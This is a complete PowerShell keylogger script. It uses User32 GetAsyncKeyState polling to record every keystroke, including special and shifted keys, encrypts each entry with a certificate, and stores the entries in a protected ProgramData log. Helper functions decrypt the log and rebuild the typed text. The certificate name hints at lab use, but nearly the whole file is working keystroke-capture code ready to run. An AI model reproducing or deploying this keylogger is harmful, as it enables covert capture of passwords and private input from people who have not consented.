# Requires -RunAsAdministrator

#region DLLs
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("User32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("User32.dll")]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("User32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
"@
#endregion

#region Configuration
$logPath = "C:\ProgramData\Security\keystrokes.log"
$pollInterval = 50 # milliseconds

# Create a secure directory
$logDir = Split-Path $logPath -Parent
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    $acl = Get-Acl $logDir
    $acl.SetAccessRuleProtection($true, $false)
    $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators", "FullControl", "Allow")
    $acl.SetAccessRule($adminRule)
    Set-Acl $logDir $acl
}
#endregion

#region Encryption Cert
$encryptionCert = Get-ChildItem Cert:\CurrentUser\My -DocumentEncryptionCert | Where-Object Subject -EQ 'CN=MyLabDocEncryption' #Select-Object -First 1

if ($null -eq $encryptionCert) {
    throw "No document encryption certificate found. Please create or import one before running this script."
}
#endregion

#region functions
# Function to encrypt string
function Protect-String {
    param([string]$plaintext)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPublicKey($encryptionCert)
    $encryptedBytes = $rsa.Encrypt($bytes, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
    return [Convert]::ToBase64String($encryptedBytes)
}

# Function to decrypt string
function Unprotect-String {
    param([string]$encryptedString)
    $encryptedBytes = [Convert]::FromBase64String($encryptedString)
    $rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($encryptionCert)
    $decryptedBytes = $rsa.Decrypt($encryptedBytes, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# Function to log keystrokes
function Trace-KeyPress {
    param([string]$key)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $encryptedLog = Protect-String "$timestamp - $key"
    Add-Content -Path $logPath -Value $encryptedLog
}

function Get-KeyChar {
    param(
        [int]$virtualKey
    )

    $kbState = New-Object Byte[] 256
    [Keyboard]::GetKeyboardState($kbState) | Out-Null
    $sb = New-Object -TypeName System.Text.StringBuilder -ArgumentList 256
    $result = [Keyboard]::ToUnicode($virtualKey, 0, $kbState, $sb, $sb.Capacity, 0)

    if ($result -gt 0) {
        $key = $sb.ToString()
        if ($key.Length -gt 0) {
            # Handle Shift and other modifier keys dynamically
            #$isShiftPressed = ($kbState[0x10] -eq 0x80)
            if ($isShiftPressed) {
                return $key.ToUpper()
            } else {
                return $key.ToLower()
            }
        }
    }
    return $null
}

# Function to read and decrypt the log file
function Read-KeyloggerFile {
    param([string]$logFilePath)

    if (-not (Test-Path $logFilePath)) {
        Write-Error "Log file not found at $logFilePath"
        return
    }

    $encryptedLines = Get-Content $logFilePath
    foreach ($line in $encryptedLines) {
        $decryptedLine = Unprotect-String $line
        Write-Output $decryptedLine
    }
}

function Convert-LogToString {
    param (
        [string]$logFilePath
    )

    # Read the log file
    $logContent = Get-Content -Path $logFilePath

    # Initialize an empty string to store the result
    $result = ""

    # Loop through each line in the log content
    foreach ($line in $logContent) {

        Write-Debug $line

        # Extract the character after the last hyphen and trim any spaces
        $char = $line.Split('- ')[-1].Trim()

        Write-Debug "Char $char"

        # Handle special keys and characters
        switch ($char) {
            "[Space]" { $result += " " }
            "[Enter]" { $result += "`n" }
            "[Backspace]" {
                if ($result.Length -gt 0) {
                    $result = $result.Substring(0, $result.Length - 1)
                }
            }
            "[Tab]" { $result += "    " }
            "-" { $result += "-" }
            default {
                # For all other characters, add them as-is
                if ($char.Length -eq 1 -or $char.StartsWith("'") -or $char.StartsWith('"')) {
                    $result += $char
                }
            }
        }
    }

    return $result
}
#endregion functions

#region Special key mappings
$specialKeys = @{
    8 = "[Backspace]"; 9 = "[Tab]"; 13 = "[Enter]"; 17 = "[CTRL]";
    18 = "[ALT]"; 19 = "[Pause]"; 20 = "[Caps Lock]"; 27 = "[ESC]"; 32 = "[Space]"; 33 = "[Page Up]";
    34 = "[Page Down]"; 35 = "[End]"; 36 = "[Home]"; 37 = "[Left]"; 38 = "[Up]"; 39 = "[Right]";
    40 = "[Down]"; 44 = "[Print Screen]"; 45 = "[Insert]"; 46 = "[Delete]"; 91 = "[Windows]";
    144 = "[Num Lock]"; 145 = "[Scroll Lock]";
    112 = "[F1]"; 113 = "[F2]"; 114 = "[F3]"; 115 = "[F4]"; 116 = "[F5]"; 117 = "[F6]";
    118 = "[F7]"; 119 = "[F8]"; 120 = "[F9]"; 121 = "[F10]"; 122 = "[F11]"; 123 = "[F12]";
}

# Shift key mappings for special characters
$shiftSpecialKeys = @{
    0xBA = ":"; 0xBB = "+"; 0xBC = "<"; 0xBD = "_"; 0xBE = ">"; 0xBF = "?";
    0xC0 = "~"; 0xDB = "{"; 0xDC = "|"; 0xDD = "}"; 0xDE = """"
}

# Shift key mappings for number keys
$shiftNumKeys = @{
    0x30 = ")"; 0x31 = "!"; 0x32 = "@"; 0x33 = "#"; 0x34 = "$"; 0x35 = "%";
    0x36 = "^"; 0x37 = "&"; 0x38 = "*"; 0x39 = "("
}
#endregion

####
#region Main loop
try {
    while ($true) {
        $kbState = New-Object Byte[] 256
        [Keyboard]::GetKeyboardState($kbState) | Out-Null

        for ($code = 8; $code -le 254; $code++) {
            $state = [Keyboard]::GetAsyncKeyState($code)

            if ($state -eq -32767) {
                $isShiftPressed = ([Keyboard]::GetAsyncKeyState(0x10) -lt 0)

                if ($specialKeys.ContainsKey($code)) {
                    $key = $specialKeys[$code]
                } elseif ($isShiftPressed -and $shiftSpecialKeys.ContainsKey($code)) {
                    $key = $shiftSpecialKeys[$code]
                } elseif ($isShiftPressed -and $shiftNumKeys.ContainsKey($code)) {
                    $key = $shiftNumKeys[$code]
                } else {
                    $key = Get-KeyChar -virtualKey $code -kbState $kbState
                    if ($null -eq $key) { continue }
                }

                Write-Host "Code = $code ; Key = $key" -ForegroundColor Yellow

                Trace-KeyPress -key $key
            }
        }
        Start-Sleep -Milliseconds $pollInterval
    }
} finally {
    # Perform cleanup if the script is interrupted
    Write-Host "Keylogger stopped. Log file is encrypted at $logPath"
}
#endregion

# Example usage:
# Read-KeyloggerFile -logFilePath "C:\ProgramData\Security\keystrokes.log" | Out-File  -FilePath "C:\ProgramData\Security\keystrokes.txt"
# Get-Content "C:\ProgramData\Security\keystrokes.txt"
# $readableString = Convert-LogToString -logFilePath "C:\ProgramData\Security\keystrokes.txt"
# Write-Output $readableString
